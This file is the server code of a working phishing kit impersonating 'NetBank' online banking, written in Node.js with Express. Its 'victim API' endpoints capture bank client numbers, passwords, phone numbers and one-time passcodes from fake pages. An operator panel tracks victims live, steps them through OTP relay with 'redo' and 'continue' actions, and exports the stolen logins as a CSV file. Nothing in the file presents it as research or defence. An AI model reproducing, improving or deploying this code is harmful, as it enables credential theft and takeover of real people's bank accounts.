/* ----------  DEPENDENCIES  ---------- */
const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');

/* ----------  CONFIG  ---------- */
const PANEL_USER     = process.env.PANEL_USER  || 'admin';
const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const COOKIE_NAME    = 'pan_sess_v2';

const app  = express();
const PORT = process.env.PORT || 3000;

console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***' });

/* ----------  SIMPLE EVENT BUS  ---------- */
const events = new (require('events')).EventEmitter();
function emitPanelUpdate() { events.emit('panel'); }

/* ----------  TRUST PROXY ---------- */
app.set('trust proxy', 1);

/* ----------  PROTOCOL MIDDLEWARE ---------- */
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] === 'https') {
    req.protocol = 'https';
    req.secure = true;
  }
  next();
});

/* ----------  CACHE CONTROL MIDDLEWARE ---------- */
app.use((req, res, next) => {
  if (req.path.startsWith('/panel') || req.path.startsWith('/api/')) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
  }
  next();
});

/* ----------  COOKIE PARSING ---------- */
app.use((req, res, next) => {
  req.cookies = {};
  if (req.headers.cookie) {
    req.headers.cookie.split(';').forEach(cookie => {
      const [name, ...rest] = cookie.trim().split('=');
      if (name && rest.length > 0) {
        req.cookies[name] = rest.join('=');
      }
    });
  }
  next();
});

/* ----------  CUSTOM SESSION MIDDLEWARE ---------- */
function signCookie(value, secret) {
  return crypto.createHmac('sha256', secret).update(value).digest('base64url');
}

function setSessionCookie(res, data) {
  const encoded = Buffer.from(JSON.stringify(data)).toString('base64url');
  const signature = signCookie(encoded, SESSION_SECRET);
  const value = `${encoded}.${signature}`;
  
  res.cookie(COOKIE_NAME, value, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
    expires: new Date(Date.now() + 24 * 60 * 60 * 1000),
    path: '/'
  });
}

function getSessionCookie(req) {
  const cookie = req.cookies?.[COOKIE_NAME];
  if (!cookie) return null;
  
  try {
    const [encoded, signature] = cookie.split('.');
    if (!encoded || !signature) return null;
    
    const expectedSig = signCookie(encoded, SESSION_SECRET);
    if (signature !== expectedSig) {
      console.log('[DEBUG] Cookie signature mismatch');
      return null;
    }
    
    return JSON.parse(Buffer.from(encoded, 'base64url').toString());
  } catch (e) {
    console.log('[DEBUG] Cookie parse error:', e.message);
    return null;
  }
}

function clearSessionCookie(res) {
  res.clearCookie(COOKIE_NAME, { 
    path: '/', 
    httpOnly: true, 
    secure: true, 
    sameSite: 'lax'
  });
}

// Session middleware
app.use((req, res, next) => {
  req.session = getSessionCookie(req) || {};
  
  if (req.session.authed) {
    req.session.lastActivity = Date.now();
  }
  
  console.log(`[DEBUG] Host: ${req.headers.host}, URL: ${req.url}, Authed: ${req.session?.authed}`);
  
  req.session.save = () => setSessionCookie(res, req.session);
  req.session.destroy = () => {
    clearSessionCookie(res);
    req.session = {};
  };
  
  next();
});

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

/* ----------  STATE  ---------- */
const sessionsMap     = new Map();
const sessionActivity = new Map();
const auditLog        = [];
let victimCounter     = 0;
let successfulLogins  = 0;
let currentDomain     = '';

/* ----------  STATIC ROUTES  ---------- */
app.use(express.static(__dirname));

app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ----------  PANEL ACCESS CONTROL  ---------- */
app.get('/panel', (req, res) => {
  if (req.session?.authed === true) {
    req.session.save();
    return res.sendFile(__dirname + '/_panel.html');
  }
  res.sendFile(__dirname + '/access.html');
});

app.post('/panel/login', (req, res) => {
  const { user, pw } = req.body;
  console.log(`[DEBUG] Login attempt - user: ${user}`);
  
  if (user === PANEL_USER && pw === PANEL_PASS) {
    req.session.authed = true;
    req.session.username = user;
    req.session.loginTime = Date.now();
    req.session.lastActivity = Date.now();
    req.session.save();
    console.log(`[DEBUG] Login success - session saved`);
    return res.redirect(303, '/panel');
  }
  
  console.log(`[DEBUG] Login failed`);
  res.redirect(303, '/panel?fail=1');
});

app.get('/panel/*', (req, res) => res.redirect(302, '/panel'));

app.post('/panel/logout', (req, res) => { 
  req.session.destroy(); 
  res.redirect(303, '/panel'); 
});

app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));

/* ----------  DOMAIN HELPER  ---------- */
app.use((req, res, next) => {
  const host  = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
  next();
});

/* ----------  UA PARSER  ---------- */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
  return u;
}

/* ----------  SESSION HEADER HELPER  ---------- */
function getSessionHeader(v) {
  if (v.page === 'success') return `✅ NetBank Login Approved`;
  if (v.status === 'approved') return `✅ NetBank Login Approved`;
  if (v.page === 'index.html') {
    return v.entered ? `🔑 Received Client + Password` : '⏳ Awaiting Credentials';
  } else if (v.page === 'verify.html') {
    return v.phone ? `📱 Received Phone` : `⏳ Awaiting Phone`;
  } else if (v.page === 'unregister.html') {
    return v.unregisterClicked ? `⚠️ Clicked Unregister` : `⏳ Awaiting Action`;
  } else if (v.page === 'otp.html') {
    return v.otp ? `🔢 Received OTP` : `⏳ Awaiting OTP`;
  }
  return `⏳ Waiting...`;
}

function cleanupSession(sid, reason, silent = false) {
  const v = sessionsMap.get(sid);
  if (!v) return;
  sessionsMap.delete(sid);
  sessionActivity.delete(sid);
}

/* ----------  VICTIM API  ---------- */

// Create new session
app.post('/api/session', async (req, res) => {
  try {
    const sid = crypto.randomUUID();
    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua  = req.headers['user-agent'] || 'n/a';
    const now = new Date();
    const dateStr = now.toLocaleString();

    victimCounter++;
    const victim = {
      sid, ip, ua, dateStr,
      entered: false, 
      clientNumber: '',
      password: '', 
      phone: '', 
      otp: '', 
      billing: '',
      page: 'index.html',
      platform: uaParser(ua).os?.name || 'Unknown',
      browser: uaParser(ua).browser?.name || 'Unknown',
      attempt: 0, 
      totalAttempts: 0, 
      otpAttempt: 0, 
      unregisterClicked: false,
      status: 'loaded', 
      victimNum: victimCounter,
      interactions: [],
      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor loaded index.html' }]
    };
    sessionsMap.set(sid, victim);
    sessionActivity.set(sid, Date.now());
    
    emitPanelUpdate();
    res.json({ sid });
  } catch (err) {
    console.error('Session creation error', err);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

// Page view tracking (for index.html load notification)
app.post('/api/pageview', (req, res) => {
  try {
    const { sid, page } = req.body;
    if (!sid || !sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    v.page = page;
    sessionActivity.set(sid, Date.now());
    
    v.activityLog.push({ 
      time: Date.now(), 
      action: 'PAGE VIEW', 
      detail: page 
    });
    
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('Pageview error', err);
    res.status(500).send('Error');
  }
});

// Ping to keep session alive
app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) {
    sessionActivity.set(sid, Date.now());
    return res.sendStatus(200);
  }
  res.sendStatus(404);
});

// Login - Capture Client Number + Password
app.post('/api/login', async (req, res) => {
  try {
    const { sid, clientNumber, password } = req.body;
    if (!clientNumber?.trim() || !password?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    v.entered = true;
    v.clientNumber = clientNumber;
    v.password = password;
    v.status = 'wait';
    v.attempt += 1;
    v.totalAttempts += 1;
    sessionActivity.set(sid, Date.now());

    v.activityLog.push({ 
      time: Date.now(), 
      action: 'CREDENTIALS ENTERED', 
      detail: `Client: ${clientNumber}` 
    });

    auditLog.push({ 
      t: Date.now(), 
      victimN: v.victimNum, 
      sid, 
      clientNumber,
      password, 
      phone: '', 
      otp: '',
      ip: v.ip, 
      ua: v.ua 
    });
    
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('Login error', err);
    res.status(500).send('Error');
  }
});

// Verify - Capture Phone
app.post('/api/verify', async (req, res) => {
  try {
    const { sid, phone } = req.body;
    if (!phone?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    v.phone = phone;
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog.push({ 
      time: Date.now(), 
      action: 'PHONE ENTERED', 
      detail: `Phone: ${phone}` 
    });

    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.phone = phone;
    
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (e) {
    console.error('Verify error', e);
    res.sendStatus(500);
  }
});

// Unregister click tracking
app.post('/api/unregister', async (req, res) => {
  try {
    const { sid } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    v.unregisterClicked = true;
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog.push({ 
      time: Date.now(), 
      action: 'UNREGISTER CLICKED', 
      detail: 'Victim clicked unregister' 
    });
    
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('Unregister error', err);
    res.sendStatus(500);
  }
});

// OTP - Capture OTP Code
app.post('/api/otp', async (req, res) => {
  try {
    const { sid, otp } = req.body;
    if (!otp?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    v.otp = otp;
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog.push({ 
      time: Date.now(), 
      action: 'OTP ENTERED', 
      detail: `OTP: ${otp}` 
    });

    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.otp = otp;
    
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('OTP error', err);
    res.status(500).send('Error');
  }
});

// Page change tracking
app.post('/api/page', async (req, res) => {
  try {
    const { sid, page } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    const oldPage = v.page;
    v.page = page;
    sessionActivity.set(sid, Date.now());

    v.activityLog.push({ 
      time: Date.now(), 
      action: 'PAGE CHANGE', 
      detail: `${oldPage} → ${page}` 
    });
    
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('Page change error', err);
    res.status(500).send('Error');
  }
});

// Get session status
app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  if (!v) return res.json({ status: 'gone' });
  res.json({ status: v.status, page: v.page });
});

// Clear redo status
app.post('/api/clearRedo', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'redo') v.status = 'loaded';
  res.sendStatus(200);
});

// Clear ok status
app.post('/api/clearOk', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'ok') v.status = 'loaded';
  res.sendStatus(200);
});

// Interaction logging
app.post('/api/interaction', (req, res) => {
  const { sid, type, data } = req.body;
  if (!sessionsMap.has(sid)) return res.sendStatus(404);
  
  const v = sessionsMap.get(sid);
  v.lastInteraction = Date.now();
  v.interactions = v.interactions || [];
  v.interactions.push({ type, data, time: Date.now() });
  sessionActivity.set(sid, Date.now());
  res.sendStatus(200);
});

/* ----------  PANEL API  ---------- */
app.get('/api/user', (req, res) => {
  if (req.session?.authed) {
    req.session.lastActivity = Date.now();
    req.session.save();
    return res.json({ username: req.session.username || PANEL_USER });
  }
  res.status(401).json({ error: 'Not authenticated' });
});

function buildPanelPayload() {
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid,
    victimNum: v.victimNum,
    header: getSessionHeader(v),
    page: v.page,
    status: v.status,
    clientNumber: v.clientNumber,
    password: v.password,
    phone: v.phone,
    otp: v.otp,
    ip: v.ip,
    platform: v.platform,
    browser: v.browser,
    ua: v.ua,
    dateStr: v.dateStr,
    entered: v.entered,
    unregisterClicked: v.unregisterClicked,
    activityLog: v.activityLog || []
  }));
  
  return {
    domain: currentDomain,
    username: PANEL_USER,
    totalVictims: victimCounter,
    active: list.filter(x => x.page !== 'success' && x.status !== 'approved').length,
    waiting: list.filter(x => x.status === 'wait').length,
    success: successfulLogins,
    sessions: list,
    logs: auditLog.slice(-50).reverse()
  };
}

// Long polling endpoint
app.get('/api/panel', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  req.session.lastActivity = Date.now();
  req.session.save();

  let responded = false;
  
  const listener = () => {
    if (responded) return;
    responded = true;
    res.json(buildPanelPayload());
  };
  
  events.once('panel', listener);
  
  setTimeout(() => {
    if (responded) return;
    responded = true;
    events.removeListener('panel', listener);
    res.json(buildPanelPayload());
  }, 1000);
});

// Panel actions (continue, redo, delete)
app.post('/api/panel', async (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  req.session.lastActivity = Date.now();
  req.session.save();

  const { action, sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  switch (action) {
    case 'redo':
      if (v.page === 'index.html') {
        v.status = 'redo';
        v.entered = false;
        v.clientNumber = '';
        v.password = '';
        v.otp = '';
      } else if (v.page === 'verify.html') {
        v.status = 'redo';
        v.phone = '';
      } else if (v.page === 'otp.html') {
        v.status = 'redo';
        v.otp = '';
        v.otpAttempt++;
      }
      break;
    case 'cont':
      v.status = 'ok';
      if (v.page === 'index.html') v.page = 'verify.html';
      else if (v.page === 'verify.html') v.page = 'unregister.html';
      else if (v.page === 'unregister.html') v.page = 'otp.html';
      else if (v.page === 'otp.html') { 
        v.page = 'success'; 
        v.status = 'approved';
        successfulLogins++; 
      }
      break;
    case 'delete':
      cleanupSession(sid, 'deleted from panel');
      emitPanelUpdate();
      break;
  }
  res.json({ ok: true });
});

/* ----------  SESSION REFRESH  ---------- */
app.post('/api/refresh', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
  
  sessionsMap.clear();
  sessionActivity.clear();
  auditLog.length = 0;
  victimCounter = 0;
  successfulLogins = 0;
  
  console.log('[DEBUG] Session refreshed by admin');
  res.json({ ok: true });
});

/* ----------  CSV EXPORT  ---------- */
app.get('/api/export', (req, res) => {
  if (!req.session?.authed) return res.status(401).send('Unauthorized');

  req.session.lastActivity = Date.now();
  req.session.save();

  const successes = auditLog
    .filter(r => r.clientNumber && r.password)
    .map(r => ({
      victimNum: r.victimN,
      clientNumber: r.clientNumber,
      password: r.password,
      phone: r.phone || '',
      otp: r.otp || '',
      ip: r.ip,
      ua: r.ua,
      timestamp: new Date(r.t).toISOString()
    }));

  const csv = [
    ['Victim#','ClientNumber','Password','Phone','OTP','IP','UserAgent','Timestamp'],
    ...successes.map(s => Object.values(s).map(v => `"${v}"`))
  ].map(r => r.join(',')).join('\n');

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="netbank_logins.csv"');
  res.send(csv);
});

/* ----------  START  ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Panel user: ${PANEL_USER}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
});
